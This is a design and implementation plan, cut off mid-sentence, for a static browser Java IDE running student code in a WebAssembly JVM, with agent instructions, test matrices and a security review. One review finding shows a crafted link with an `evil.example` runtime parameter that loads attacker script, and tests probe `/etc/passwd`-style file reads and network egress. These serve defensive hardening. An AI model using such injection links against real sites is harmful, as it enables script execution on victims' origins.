# Browser-only Java IDE — implementation plan

**Status:** Proposed implementation plan  
**Target:** A lightweight, static-hosted Java IDE using a hardened fork of [JavaBox](https://github.com/bmarti44/javabox)  
**Primary goal:** Compile and execute small, multi-file Java projects entirely in the browser, with interactive console I/O, without any backend or permanent project storage.
**UI reference:** [Klode](https://klode.app), our existing browser-based Python environment. Reuse its visual language and interaction patterns where appropriate; extend them for Java projects rather than copying Klode’s single-file limitation.

> **Instructions to the coding agent:** Execute the work in phases, in order. First inspect and run the upstream JavaBox project; do not assume an undocumented API exists. Preserve a working baseline and automated tests before optimizing. At each gate, record commands, measurements, failures, and decisions. Implement the smallest vertical slice that proves the hard requirements before building the full UI. If a phase is blocked, document the blocker and a minimally invasive alternative instead of silently dropping requirements.

## 1. Product requirements

### Required

- Java syntax highlighting and basic code editing.
- Multiple `.java` files, with create, rename and delete operations; use relative paths to support Java packages.
- Compile all files together, including cross-file references; select a `public static void main(String[] args)` entry point.
- Run the selected main class, with stdout, stderr, compilation diagnostics, and uncaught exceptions displayed in a console.
- **Interactive** stdin: programs may call `Scanner.nextLine()` and wait for input **after** execution has started. Pre-supplying all input is not sufficient.
- A responsive Stop control, including for infinite loops and blocked stdin reads.
- Restore source files and UI state after reload of the same tab using `sessionStorage`. Do not intentionally persist projects across browser sessions or use IndexedDB/localStorage for project data.
- No accounts, network compilation service, server-side JVM, or application backend. Static hosting is permitted.
- Prefer correct, ordinary Java behavior for small introductory programming assignments.

### Out of scope (initial release)

Autocomplete/LSP, debugging, Maven/Gradle, arbitrary third-party JAR upload, GUI libraries, network access from student programs, multithreaded student applications, and persistent project storage.

### Security and scope

The runtime executes **untrusted student code**. Target a best-effort, capability-restricted browser execution environment, not a formally verified sandbox. Do not claim that `jlink`, a Worker, or WebAssembly alone guarantees isolation. Treat the browser origin, host imports, memory/CPU resource limits and teardown as separate controls. Any residual host capability must be documented.

## 2. Proposed architecture

```text
IDE origin (static TypeScript app)
  ├─ File explorer / project model (in-memory)
  ├─ CodeMirror 6 Java editor
  ├─ Console (stdout, stderr, input, status)
  ├─ sessionStorage adapter (source + UI state only)
  └─ JavaEngine API
        │ structured messages / compiled classes
        ▼
  Browser execution environment
    ├─ JavaBox WebAssembly + trimmed OpenJDK 21 runtime
    ├─ in-memory Java source/bytecode manager
    ├─ compiler integration (javax.tools.JavaCompiler)
    ├─ interactive stdin/stdout/stderr bridge
    └─ disposable execution lifecycle
```

**Initial implementation:** Prefer one **disposable JVM context per compile-and-run operation**, provided startup and memory use are acceptable. This is the simplest isolation model. If measured startup cost is unacceptable, move compilation into a persistent compiler Worker and run only student bytecode in a separate disposable execution context. Do **not** continue executing arbitrary student programs within a persistent trusted compiler service without identifying the risks and providing a teardown strategy.

Prefer a dedicated runtime origin in a sandboxed iframe for a deployed public IDE if testing confirms JavaBox's Worker/`SharedArrayBuffer` requirements can be met. A Worker on the IDE origin is a responsiveness/termination boundary, **not** a security-origin boundary. Do not treat the separate origin as a substitute for auditing the runtime's host imports.

## 3. Repository setup and reconnaissance — Phase 0

1. Clone JavaBox with submodules; record upstream commit SHA and submodule revisions.
2. Read `README.md`, `AGENTS.md`, `build/build-direct.sh`, `build/build-jdk-modules.sh`, `build/jvm-main.c`, `build/CompileServer.java`, the SDK, and Emscripten link scripts. Confirm actual paths; upstream may change.
3. Run the upstream demo with the recommended COOP/COEP headers. Verify a one-file Hello World, standard output and current stdin behavior.
4. Run existing tests. Build from source if feasible. If using prebuilt artifacts temporarily, record that changes to the class library / native host bindings require a source build.
5. Document the actual protocol, compilation model, native imports, filesystem mounts, networking support, persistent storage, termination behavior, Worker topology, browser compatibility and thread assumptions.
6. Record baseline metrics: total compressed/uncompressed assets, `.wasm`/`.data` sizes, cold startup, warm compilation, runtime memory, and compile+run latency. Include test hardware and browser.
7. Audit repository and third-party licences (MIT for JavaBox repository; OpenJDK GPLv2 + Classpath Exception and other components may impose separate redistribution/source requirements). Preserve notices and document the distribution plan.

**Gate 0:** Baseline works locally, tests can be run, relevant runtime interfaces are mapped, and baseline measurements have been saved under `docs/baseline.md`.

## 4. Multi-file compilation — Phase 1

Implement a structured compile/run protocol rather than extending a newline-delimited source protocol with ambiguous delimiters.

Suggested request/response model (adapt to upstream implementation):

```ts
type SourceMap = Record<string, string>; // relative paths -> UTF-8 text

type CompilerDiagnostic = {
  file: string;
  line: number;
  column?: number;
  severity: 'error' | 'warning';
  message: string;
};

type CompileRequest = {
  requestId: string;
  files: SourceMap;
};

type CompileResult = {
  requestId: string;
  success: boolean;
  diagnostics: CompilerDiagnostic[];
  classes?: Record<string, Uint8Array>; // or a binary transfer envelope
};
```

- Compile **all** `.java` files in a single `JavaCompiler` task with an in-memory `JavaFileManager` and diagnostics collector.
- Support package declarations, nested package paths, references across files, and multiple generated `.class` files per source (including nested classes).
- Avoid writing compiled output to persistent browser storage.
- Return structured diagnostics with source path and line/column information. Handle compiler crashes distinctly from student compilation errors.
- Ensure each build replaces the previous compilation result; do not accidentally execute stale bytecode when compilation fails.
- Validate and normalize project-relative paths. Reject `..` traversal, absolute paths, duplicate normalized paths, and unreasonably large projects.

**Gate 1:** `example/Main.java` compiles when it uses `example/Calculator.java`; syntax errors in either source produce file-specific diagnostics; edits to the second file take effect on the next run.

## 5. Console and execution lifecycle — Phase 2

Implement a runtime-independent adapter:

```ts
interface JavaEngine {
  initialize(): Promise<void>;
  compile(files: Record<string, string>): Promise<CompilerDiagnostic[]>;
  run(mainClass: string, onEvent: (event: RuntimeEvent) => void): Promise<void>;
  sendInput(text: string): void; // deliver line/bytes using a documented convention
  stop(): Promise<void>;
  dispose(): Promise<void>;
}
```

The concrete implementation may combine `compile`/`run` into one disposable runtime operation internally. Define typed lifecycle events: `initializing`, `compiling`, `running`, `waiting-for-input` (if reliably observable), `stdout`, `stderr`, `exit`, `error`, `stopped`.

- Capture `System.out` and `System.err` separately; preserve output order where possible and document ordering limitations.
- Integrate JavaBox's existing `SharedArrayBuffer`/`Atomics` stdin bridge. Confirm actual behavior rather than assuming that the compile service and student `System.in` are independent.
- Design separate control and student-input channels, or otherwise ensure user input cannot be parsed as a control command.
- Handle a prompt without a trailing newline, input requested multiple times, EOF, and cancellation while blocked in `Scanner`/`BufferedReader`.
- Implement Stop as actual teardown of the execution context. Enumerate and terminate any Emscripten pthread Workers, and verify that a new run does not inherit code, threads, streams, or globals from the old run.
- Add output truncation/streaming with a visible message when a configurable output cap is reached.
- Enforce an execution timeout and test that timeouts cannot block the IDE UI.
- Reject concurrent runs or support them explicitly; start with exactly one run at a time.

**Gate 2:** A Java program that prints a prompt, waits for input, and prints a response works. `while(true)` stops. Stopping during `Scanner.nextLine()` works. A clean subsequent run succeeds.

## 6. Minimize JDK and exposed capabilities — Phase 3

### 6.1 JDK module reduction

- Establish a working source-built baseline before changing module lists.
- JavaBox currently maintains an explicit module list in `build/build-jdk-modules.sh`; examine the corresponding container/Docker build and align any duplicated configuration.
- Start with `jdk.compiler` plus transitive dependencies (including `java.base` / `java.compiler`); add other modules **only when compatibility tests demonstrate a need**.
- Keep `java.base` intact initially. Its filesystem, network, reflection, process and class-loading APIs mean that module removal alone does **not** prevent these operations.
- Build without Doom assets / unnecessary graphical, audio or demo bindings. Remove native stubs only after verifying the JVM no longer requires them during initialization.
- Use `jlink --strip-debug --no-header-files --no-man-pages` and supported compression settings as appropriate for the chosen JDK.
- Repeat baseline functional tests and compare build sizes and boot times against Phase 0. Avoid size optimization that makes compiler/runtime functionality unreliable.

### 6.2 Restrict actual host capabilities

Inspect the WASM module imports, JavaBox's JNI/native bridges, Emscripten link flags, filesystem integration and JavaScript SDK:

- **Network:** deny outbound connections at the host boundary, not merely by omitting `java.net.http`. Also apply origin-level CSP restrictions where compatible with runtime initialization. Explicitly test both `java.net.Socket` and `HttpURLConnection`.
- **Filesystem:** allow only controlled ephemeral runtime paths if file exercises are supported. Never mount the user's filesystem or the IDE's project storage directly into the student JVM. Test reads/writes, path traversal, and attempts to access files outside the allowed virtual root.
- **Native/browser host API:** expose only essential console and runtime interfaces; remove unnecessary graphics/audio/input/native callbacks. Ensure there is no general-purpose Java-to-JavaScript escape bridge exposed to student programs.
- **Processes/native libraries:** test `ProcessBuilder`, `Runtime.exec`, and arbitrary `System.load` / `System.loadLibrary`; deny unsupported host actions.
- **Storage:** no IndexedDB/localStorage/OPFS persistence from the execution environment. Audit Emscripten filesystem mounts and SDK behavior.
- **Resources:** bound WASM memory and output; cap per-run execution duration, source size, number of files, and (where practical) virtual filesystem size. Note that timeouts do not guarantee a strict CPU quota.

Maintain `docs/capability-matrix.md` with each capability marked **allowed / denied / unsupported / unverified**, the enforcement layer, and the test proving its behavior. Do **not** claim isolation based on source-level filters or simple attempts to delete Java classes.

**Gate 3:** The trimmed runtime passes required Java tests; prohibited host capabilities fail predictably; build sizes and performance changes are measured; remaining isolation gaps are documented.

## 7. Frontend IDE — Phase 4

### 7.1 UI/UX reference: Klode

Use **[Klode](https://klode.app)**, our existing online Python environment, as the **primary UI and interaction reference**. Inspect the running site before implementing the frontend, and, if available and authorized, inspect its source repository to identify reusable design tokens, layout conventions, components, keyboard interactions, and console behavior. Do not assume access to its source code or copy it without checking the repository licence.

Aim for the same lightweight, deliberately uncluttered experience:

- **Visual continuity:** Take Klode's typography, spacing, colors, button treatment, and overall visual hierarchy as the starting point. A Java environment should feel like a companion to Klode, not a different product.
- **Editor and console:** Follow Klode's clear editor-to-console relationship, Run feedback, and simple line-oriented stdin interaction. Preserve output without newline so prompts are visible before input is submitted.
- **Interaction simplicity:** Favor obvious controls and minimal chrome; do not introduce VS Code-style panels, command palettes, debugging affordances, AI assistance, or autocomplete as part of the initial UI.
- **Adaptations for Java:** Klode currently presents a single `main.py` workspace; **do not inherit that single-file constraint**. Add a compact file explorer with create/rename/delete, support package-relative paths, and an explicit main-class selection control without losing the minimal feel.
- **Responsive layout:** Inspect Klode's actual desktop and mobile behavior, then adapt as necessary to accommodate a file list and Java's more verbose source. Keep the console and stdin usable on narrow screens.
- **Accessibility:** Use labelled controls, visible keyboard focus, accessible console updates, and keyboard-operable file actions.

Before implementing, save a short `docs/klode-ui-reference.md` recording observed layout, styles, controls, responsive behavior, and which aspects should be retained or adapted. Include screenshots if permitted. Treat Klode as a **design reference**, not an obligation to reproduce its implementation or Python-specific feature boundaries.

### 7.2 Implementation

Use Vite + TypeScript, CodeMirror 6 (Java language package), and minimal UI components. Avoid a large IDE framework.

Suggested structure:

```text
src/
  main.ts
  project/
    model.ts
    ProjectManager.ts
    SessionStorage.ts
  editor/
    JavaEditor.ts
  console/
    JavaConsole.ts
  runtime/
    JavaEngine.ts
    JavaBoxEngine.ts
    runtime-protocol.ts
    execution.worker.ts    # if supported by chosen runtime topology
  ui/
    FileExplorer.ts
    Toolbar.ts
```

Project model:

```ts
interface JavaProject {
  files: Record<string, string>;
  mainClass: string;  // fully qualified, e.g. example.Main
  activeFile: string;
}
```

- File explorer: create, rename and delete `.java` files. Keep package paths and filename semantics explicit; do not attempt full refactoring on rename in V1.
- Editor: one open file, syntax highlighting, undo/redo, normal indentation, and unsaved edits reflected in the in-memory project model.
- Console: output pane, stdin input line, Run/Stop, clear output, exit/error status, and structured diagnostics (clickable diagnostic opens source at line if practical).
- Main class: explicit selection to avoid ambiguous automatic discovery. Provide a sensible default for a new project.
- Persistence: debounce saving `JavaProject` to `sessionStorage`; save file operations immediately. On reload restore project; on a new independent session start with the template project. Do not persist compiled classes or console contents.
- Document caveats: browsers may restore tab sessions, duplicate tabs may inherit an initial storage snapshot, and `sessionStorage` is not a secure deletion guarantee. Catch quota/security errors and continue in-memory.
- Static assets must be served with correct MIME types and `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp` (or a tested alternative compatible with `SharedArrayBuffer`).

**Gate 4:** Users can make a two-file project, compile it, interact with it via stdin, stop it, reload to recover source, and start a fresh independent browser session without the prior project being loaded by design. The interface is visibly and behaviorally consistent with Klode where appropriate, and the differences needed for multi-file Java projects are documented.

## 8. Optional stronger origin isolation — Phase 5

For production deployment supporting arbitrary user code:

- Prototype a sandboxed runtime iframe on a distinct origin with a minimal validated `postMessage` protocol.
- Keep the IDE's session storage and editor outside the runtime origin. Do not pass credentials or privileged host objects into the runtime.
- Test whether cross-origin isolation (`COOP`, `COEP`), iframe permissions/sandbox flags, Workers and `SharedArrayBuffer` all function in the selected deployment topology.
- Apply a restrictive CSP and verify that intended runtime asset loading works while unexpected network egress is blocked.
- Implement per-run iframe teardown if needed to reliably terminate all Emscripten Workers.
- If the architecture cannot meet these constraints without a major redesign, document the precise limitations and avoid describing the deployment as secure for arbitrary adversarial code.

**Gate 5:** The editor remains usable when the runtime hangs or terminates; the runtime cannot access IDE-origin storage by ordinary web-origin mechanisms; origin and host-API limitations are documented.

## 9. Acceptance-test matrix

Automate with Playwright where possible; keep focused Java fixtures under `tests/fixtures/`.

| Test | Expected result |
|---|---|
| `Main.java` calls `Calculator.java` | Compiles and prints correct result |
| Two files in a declared package | Compiles; fully qualified main works |
| Syntax error in second source file | Diagnostic includes correct path and line |
| Edit second file, then rerun | New output; no stale class execution |
| `System.out.print` without newline | Prompt visible before stdin response |
| `Scanner.nextLine` after execution starts | Can submit input and resume |
| Multiple sequential stdin reads | Correct input ordering |
| Uncaught exception | Stack trace on stderr, non-successful status |
| `while(true)` | Stop/timeout terminates execution, UI responsive |
| Stop while waiting for stdin | Runtime terminates; next run works |
| `System.exit(0)` | Does not terminate the browser/IDE or break later runs |
| Excessive output | Truncated safely with notice |
| Network socket / HTTP attempt | Denied or clearly unsupported |
| File I/O outside virtual root | Denied |
| `ProcessBuilder` / native loading | Denied or clearly unsupported |
| Reload the tab | Source and UI state restored |
| New independent browser session | No project intentionally retained |
| Chromium / Firefox / Safari | Record result and known limitations |

Record measured cold start, repeat-run latency, JS heap/WASM memory, total asset sizes, and output behavior; do not promise numerical performance targets until the first benchmark exists.

## 10. Delivery checklist

Status 2026-11-10: all items done. Evidence in brackets.

- [x] ~~Working JavaBox fork~~ Upstream pinned as a submodule (`506756b`), **no fork** by decision; our own `jvm-main.c` and link step replace upstream's at build time (§14 N1). [`vendor/javabox`, `runtime/native/`]
- [x] Repeatable source build and local static server with required headers. [`scripts/build-runtime-source.sh`, `docs/runtime-build.md`, `scripts/serve.mjs`, `security-headers.mjs`]
- [x] Multi-file compiler and structured diagnostics. [`runtime/java/CompileServer.java`, `tests/host/`, `ide.spec`]
- [x] Interactive console (stdin, stdout, stderr) and reliable Stop. [`slice.spec`, `ide.spec`, `correctness.spec`]
- [x] Trimmed JDK build and documented capability restrictions. [`java.base,jdk.compiler,java.logging`; `docs/capability-matrix.md`, `capabilities.spec`]
- [x] Minimal IDE: CodeMirror, file operations, main-class selection, console. [`src/`, `ide.spec`, `transfer.spec`]
- [x] Klode-inspired UI with a documented visual/interaction reference and Java-specific adaptations. [`docs/klode-ui-reference.md`, `docs/screenshots/`]
- [x] `sessionStorage` reload behavior with no intentional permanent storage. [`src/project/SessionStorage.ts`, `ide.spec`, `transfer.spec` E4]
- [x] Automated browser and adversarial-behavior tests. [`tests/e2e/` in Chromium, Firefox, WebKit: 104 passed, 10 skipped (browser-specific); `security`, `spoofing`, `isolation`, `capabilities`]
- [x] Baseline versus trimmed-runtime benchmarks. [`docs/baseline.md`: sizes, boot, compile+run, memory, caching]
- [x] `README.md` for development, build and deployment. [`README.md`, `docs/deployment.md`]
- [x] `docs/architecture.md`, `docs/capability-matrix.md`, `docs/licensing.md` and `docs/limitations.md`.
- [x] Security review findings S1–S9 (§13) mitigated or explicitly accepted, each with its verifying test. [S1/S4 `security.spec` + `isolation.spec`; S2/S7 `security.spec`; S3 build check + `capabilities.spec`; S5 `docs/deployment.md`; S6/S8 `scripts/verify.mjs`; S9 `spoofing.spec`, residual spoofing of a program's own status accepted in `docs/limitations.md`]

Known limitations that remain (see `docs/limitations.md`): recursion depth ~700 nested calls;
Safari/WebKit runs the runtime same-origin (no sandbox); `Files.getFileStore` /
`probeContentType` unsupported; real Edge and the exam laptop not yet tested (owner).

## 11. Working conventions for the coding agent

1. Make small, reviewable commits per phase; preserve compatibility with upstream wherever feasible.
2. Run the available tests after modifying build scripts, the native bridge, compilation protocol, or Worker orchestration.
3. Do not modify `java.base` or OpenJDK internals unless host-level restrictions demonstrably cannot solve the requirement; explain the trade-off first in the implementation notes.
4. Never replace interactive stdin with an all-input-upfront approximation without clearly marking the requirement unmet.
5. Never mask a missing security mechanism with a UI restriction or a Java source-code blacklist.
6. Do not silently fall back to remote compilation or store project source on a server.
7. Keep evidence-based notes on unsupported browsers, features, and claims of isolation.
8. Prioritize a working, testable end-to-end implementation over speculative feature work.

## 12. Useful upstream references

- Klode UI reference: https://klode.app
- JavaBox repository: https://github.com/bmarti44/javabox
- JavaBox README and build instructions: https://github.com/bmarti44/javabox/blob/main/README.md
- JDK modules build script: https://github.com/bmarti44/javabox/blob/main/build/build-jdk-modules.sh
- Java compilation service: https://github.com/bmarti44/javabox/blob/main/build/CompileServer.java
- OpenJDK `jlink` documentation: https://docs.oracle.com/en/java/javase/21/docs/specs/man/jlink.html

**First coding-agent action:** Inspect the upstream repository, run its demo, and report Gate 0 findings. Then implement a minimal two-file + interactive-stdin + Stop vertical slice before modifying UI or optimizing the JDK image.

## 13. Security review findings and mitigations (2026-11-10)

Review of the implementation after Phases 0–4 (code reading plus the capability probes in
`tests/e2e/capabilities.spec.mjs`; no exploit was built). **Threat model:** there is no
project sharing, so untrusted code reaches the IDE when a user types or pastes it, e.g. a
snippet from a peer or the internet. A second attacker is anyone who can get a user to
open a crafted link to the deployed origin. Findings are ordered by priority. Each one is
closed only when its verifying test exists and passes, or when the owner explicitly accepts
the residual risk in `docs/limitations.md`.

| ID | Severity | Finding | Mitigation | Phase | Verification |
|---|---|---|---|---|---|
| S1 | **High** | `public/runtime/host/runtime-host.js` trusts URL parameters: `?runtime=` sets the URL that `javabox-direct.mjs` is imported from, `?driver=` the URL the driver classes are fetched from, `?jvmArg=` adds JVM options (honoured by the source build). A crafted link (`…/runtime/host/runtime.html?runtime=https://evil.example/`) runs attacker JavaScript on our origin; COEP doesn't prevent it, because the attacker can serve CORS/CORP headers. | Remove `runtime`, `driver` and `jvmArg`; hard-code same-origin relative paths. Keep only `outputCap`, parsed as a bounded integer. Diagnostics that need JVM flags use a dev-only build flag, not a URL parameter. | 3 (now) | e2e: loading `runtime.html?runtime=<other origin>` makes no request to that origin and still boots the local runtime; unit/grep check that the host reads no other parameters. |
| S2 | **High** | No Content-Security-Policy on any page, so nothing limits script sources, network egress or framing. | Serve a CSP on all responses: `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` (relax `frame-ancestors` to `'self'` for the runtime iframe document only). Add it to `scripts/serve.mjs`, `vite.config.ts` (dev/preview) and a deployment headers file (`_headers` / `netlify.toml` or equivalent), and document it in the README. Verify Emscripten pthread Workers and WASM instantiation still work in all three engines. | 3 (now) | e2e: CSP header present on `/`, `/runtime/host/runtime.html`, assets; a `fetch('https://example.com')` from the page is blocked; Gate 2/4 suites still pass in Chromium, Firefox, WebKit. |
| S3 | Medium | Emscripten SOCKFS is linked, and its `connect()` opens `new WebSocket(ws://host:port)`. Java can't reach it today (`InetAddress.<clinit>` fails because libnet is not linked), but a memory-corruption bug in the WASM JVM (new C++ port of HotSpot Zero) could call the socket syscalls directly, which would be network egress. | Defence in depth: (a) CSP `connect-src 'self'` (S2) blocks WebSocket egress at the browser; (b) leave socket support out at link time in our own link step (N1 in §14), so socket syscalls fail with an error instead of reaching SOCKFS; (c) keep libnet unlinked. | 3 | Capability probes still deny `Socket`/HTTP/DNS; a test that calls the socket syscall path from JS inside the runtime iframe gets an error and opens no WebSocket (`page.on('websocket')` stays empty). |
| S4 | Medium | The runtime iframe is **same-origin** with the IDE. Any escape from WASM into JavaScript (glue bug, future host import, S1-style injection) gives full control of the IDE page, its DOM and `sessionStorage`. | Phase 5: serve the runtime from a dedicated origin (separate subdomain or host) in an iframe with `sandbox="allow-scripts"` (no `allow-same-origin` relative to the IDE), validated `postMessage` with explicit `targetOrigin` on both sides, COOP/COEP/CORP and CSP on the runtime origin. Until then, document the IDE as not safe for adversarial code. | 5 | Gate 5: from inside the runtime frame, `parent.document`, `parent.sessionStorage` and IDE cookies are inaccessible; IDE stays responsive when the runtime hangs or is torn down. |
| S5 | Medium | **Hosting on a shared origin** (e.g. a school domain that also serves other apps) would turn S1/S4 into access to other apps' cookies and storage. | Deploy the IDE on its own origin (dedicated subdomain), and the runtime on another (S4). No cookies are set by the IDE; keep it that way. Record the hosting requirement in the README and a deployment checklist. | 4/5 (deployment) | Deployment checklist reviewed; response headers checked by a smoke test against the deployed URL. |
| S6 | Low | `slice.html` (engine test page exposing `window.engine`) and the diagnostic e2e entry points are built into `dist/` and would be deployed. | Build `slice.html` only for tests (separate Vite mode or `E2E=1`), or move it under a test-only directory excluded from production builds. Production `dist/` contains only `index.html`, assets, runtime and notices. | 4 | Build check: production `dist/` has no `slice.html`; e2e builds include it. |
| S7 | Low | Clickjacking: other sites can frame the IDE. | `frame-ancestors 'none'` on the IDE (part of S2) and `X-Frame-Options: DENY` for older browsers; the runtime document allows only `'self'` (later: the IDE origin). | 3 | Header test as in S2; framing the IDE from another origin fails. |
| S8 | Low | Supply chain: (a) JavaBox, its OpenJDK fork and libffi are single-maintainer repos (pinned by commit); (b) the upstream prebuilt is fetched from a `workers.dev` demo without an integrity pin; (c) `@playwright/test` uses a `^` range; (d) runtime assets served without integrity verification by the page. | (a) Keep the three repos pinned by commit (no fork, by decision 2026-11-10); review the upstream diff, including our two overridden files (N1), on every bump. (b) Never deploy the prebuilt (it also contains GPL Doom code); if it's used in dev, pin its SHA-256 in `scripts/prepare-runtime.mjs` and refuse mismatches. (c) Pin all npm versions exactly; commit the lockfile; use `npm ci`. (d) Record SHA-256 of `javabox-direct.{mjs,wasm,data}` and driver classes in `runtime.json` (exists) and verify them in CI before deployment. | 3 | CI step verifies pins and fails on mismatch; `package.json` has no ranges. |
| S9 | Low (accepted risks, document) | (a) Student code can write to the driver's control device or the stdin file and spoof its *own* status events (fake exit, fake diagnostics); rendering is via `textContent`, so no XSS. (b) Resource use up to 2 min wall clock, 512 MB WASM per context (max. two contexts), 1 MB output, on the user's own device only. (c) Source code sits in plaintext `sessionStorage`; tab/session restore on shared computers can bring it back. | (a) Keep `textContent`-only rendering and the existing message validation; add a regression test that a spoofed diagnostic containing HTML renders as text. Optional: a per-run random token in control events (raises the bar, doesn't eliminate). (b) Keep limits; consider a lower default timeout and a visible memory note. (c) Tell users in the UI or footer; offer a "Clear project" action that removes the stored session. | 4 | XSS regression test; limits covered by existing timeout/output tests; "Clear project" e2e. |

Already in place, and kept as defence in depth (not the security boundary): path
validation and size limits (`src/project/paths.ts`, driver), stripping control characters
from user input with the reserved EOF byte, the single-use GO control line, `postMessage`
origin/source checks on both sides, the student class loader parented to the platform
loader, disposable runtime per run, libnet/process/native loading unavailable (verified by
capability probes).

**Order of work:** S1, S2, S6, S7 first (small changes, and they close the only concrete
exploit); then S3, S8; then Phase 5 (S4, S5); S9 items alongside the IDE work.
Update `docs/capability-matrix.md` and `docs/limitations.md` as each item lands.

## 14. Exam use: context and resulting priorities (2026-11-10)

**Context.** The IDE is used during exams on university-supplied systems. We control only
this website; the browser, exam procedure and machines can't be changed by us or by
students. Known from Klode's documentation (same exam setting): Microsoft Edge on a
restricted Windows exam laptop, a network whitelist, and answers handed in by native
copy/paste into ans.app. Our own origin can be whitelisted when needed. Verification on
the exam laptop and in real Edge is out of scope for this plan; the owner does it when
necessary.

**Consequences for the design**

- Serve everything from **one HTTPS origin** (already true: no CDN, no external requests),
  so one whitelist entry is enough.
- **Chromium/Edge is the primary target.** Firefox and WebKit stay supported but are
  secondary; mobile layout is not a priority.
- Phase 5 isolation should use the **opaque-origin sandboxed iframe**
  (`sandbox="allow-scripts"`, no second origin, no extra whitelist entry). Feasibility
  probe (2026-11-10): parent DOM and `sessionStorage` are blocked in all three engines,
  `SharedArrayBuffer` and shared WASM memory work, and cross-origin module import and
  fetch work with CORS. URL-based Workers are refused, and Chromium refuses blob *module*
  Workers but accepts classic blob Workers. So pthreads need a classic-blob worker
  wrapper through Emscripten's `mainScriptUrlOrBlob`, which buffers messages until the
  module has loaded. Not yet verified end to end with JavaBox.

**Exam work items, in order**

| ID | Item | Acceptance |
|---|---|---|
| E1 | **Copy for Ans.** Native copy from the editor is exact (indentation, tabs, non-ASCII). Add **"Copy all files"**: one text block, each file preceded by a header line `// File: <path>`. Add "Copy file". Show a short confirmation; if the Clipboard API is refused, fall back to selecting the text for manual copying. | e2e: clipboard contents equal the sources byte for byte (incl. Unicode and indentation) for one and for multiple files; the fallback path is tested with clipboard permission denied. |
| E2 | **Paste project.** An import dialog that accepts the E1 format (or a single class without headers) and replaces or merges the project after confirmation; paths validated with the existing rules. Used for starter code copied from an exam question. | unit: round trip E1 → E2 is lossless; malformed headers and invalid paths are rejected with a message; e2e: paste a three-file project and run it. |
| E3 | **Security S1, S2 (CSP incl. `frame-ancestors`), S6, S7** from §13, before any exam use. | as in §13. |
| E4 | **Don't lose work by accident.** `beforeunload` warning while the project differs from the template; keep `sessionStorage` recovery after reload (§1). A visible **"New project"** action that resets to the template after confirmation, and clears stored state. | e2e: reload restores; "New project" clears storage; the unload prompt is registered when the project was changed. |
| E5 | **Loading at exam start.** Hashed, immutable asset and runtime file names with long cache lifetimes; HTML revalidated; precompressed (brotli/gzip) runtime files; a deployment headers file for the chosen static host. Optional: a service worker that caches the runtime so Run keeps working through brief network outages. | Header test on a production-like server; a second page load transfers < 100 KB; optional service-worker test with the network disabled after the first load. |
| E6 | **Memory.** Measure peak memory for boot + run + spare in Edge/Chromium; skip pre-booting the spare runtime when `performance.memory`/`deviceMemory` indicate a low-memory device, or after a failed allocation. | Measurement recorded in `docs/baseline.md`; a test that forces "no prewarm" still runs programs correctly. |
| F1 | **File I/O.** Make `java.io` and `java.nio.file` reads and writes work on MEMFS (today `Files.writeString("/tmp/x.txt")` fails with *No such file or directory*). Working hypothesis, not yet verified: the class library is jlinked from the **macOS** JDK, so generated platform constants such as `sun.nio.fs.UnixConstants` (`O_CREAT`, `O_EXCL`, …) carry macOS values that differ from Emscripten's. Fix without a fork, e.g. a corrected class supplied through `--patch-module java.base=…` (the source build honours JVM arguments) or by jlinking from a Linux JDK with matching values. Files stay ephemeral per run (MEMFS). | Fixtures: write, append, read back, list, delete via `java.io` and `java.nio.file`; reading `/etc/passwd`-style host paths still fails; capability matrix updated. |
| N1 | **Own native entry point and link step (no fork).** Keep JavaBox pinned and unmodified. `scripts/build-runtime-source.sh` places our own `runtime/native/jvm-main.c` into the build copy and links with our own command instead of `link-direct-wasm.sh`. Our `jvm-main.c` drops the Doom, audio and AWT natives and their 10 exports (56 symbols, ~69 KB incl. a 67 KB static audio buffer), the misplaced `EM_JS` FS/stdin hooks, and fixes the stdin futex lost-wakeup. Our link step omits socket support (S3), lowers initial memory and sizes the pthread pool to what is needed (E6). Both files are diffed against upstream on every JavaBox bump. | The `.wasm` exports and the static JNI symbol table contain no Doom/AWT symbols; Gate 2/4 suites and capability probes pass; memory before/after recorded in `docs/baseline.md`. |
| E7 | **Java correctness checks that matter in exams:** UTF-8 output and input (e.g. `"café"`, `"€"`), `Scanner` with `nextInt` mixed with `nextLine`, empty input lines, long output, exceptions with causes. | Fixtures + e2e assertions on exact output. |

**Deprioritised for exam use:** file download/zip/import from disk, starter-code links in
the URL, Dutch UI, in-app font size, mobile layout, JUnit/Swing/threads/file I/O (unless
exam questions need them), a separate runtime origin.

**Decisions (2026-11-10):**
- Keep `sessionStorage` recovery after reload (§1); Klode's no-recovery behaviour is not adopted.
- No fork of JavaBox. Upstream stays pinned and unmodified; we maintain our own
  `jvm-main.c` and link step (N1) instead.
- Accepted without fixing: the JVM's `Finalizer`/`Common-Cleaner` threads die at boot;
  input goes through the MEMFS file channel rather than the upstream ring buffer.
- Not pursued: the one-off 10× Firefox/WebKit slowdown observed in a single full e2e run
  (`docs/baseline.md`).

## 15. Optional follow-ups

### O1 — Origin separation in Safari via a second origin (not planned)

**Situation.** Safari/WebKit can't run the runtime in the opaque-origin sandbox (ADR-10): it
does not make opaque-origin frames cross-origin isolated, so shared WASM memory can't be
posted to Workers (`DataCloneError`). The engine falls back to a same-origin frame. That frame
still fetches nothing and has `connect-src 'none'`, but has no origin separation from the IDE.
Exams run on Edge, which gets the full sandbox; Safari is the owner's development browser.

**Probe (2026-11-10, Playwright WebKit/Chromium/Firefox, page and frame on different ports):**

| Frame | WebKit | Chromium | Firefox |
|---|---|---|---|
| same host, sandboxed (opaque origin) | not isolated; shared memory to Worker fails | works | works |
| real second origin, no `sandbox` | isolated; parent DOM blocked; shared memory to Worker works | works | works |

Not verified in real Safari, and JavaBox itself was not run in the second-origin setup.

**Design if built.** Extend the existing fallback: sandbox first; if the frame reports it isn't
isolated *and* `KOPJE_RUNTIME_ORIGIN` is configured, reload it as a cross-origin iframe on
that origin (optionally `sandbox="allow-scripts allow-same-origin"`, which keeps that origin
but blocks popups, forms and top navigation); otherwise today's same-origin fallback.
Engine messages use that exact origin. The runtime origin's `frame-ancestors` names the IDE
origin, so header files are written per origin.

**Cost.** Development: about half a day (most of it a two-origin test setup and isolation tests
in three engines). Operations: a second static site/hostname serving the same `dist/` (free
tiers usually suffice; traffic barely changes because the IDE page fetches the runtime files),
two header configurations per release (`verify:dist` extended), possibly a second exam
whitelist entry (depends on enforcement: top-level visits only, browser URL policy, or network
